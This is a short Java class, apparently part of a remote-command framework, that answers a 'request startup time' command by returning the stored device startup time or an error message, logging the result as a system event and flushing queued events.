package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.info.StartupTimeDb;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCRequestStartupTime extends PCCRmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	private StartupTimeDb startupTime = Global.getStartupTimeDb();
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.REQUEST_STARTUP_TIME.getId());
		try {
			responseMessage.append(Constant.OK);	
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.REQUEST_STARTUP_TIME);
			responseMessage.append(startupTime.getStartupTime());
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());	
		// To send events
		eventSender.sendEvents();
	}
}
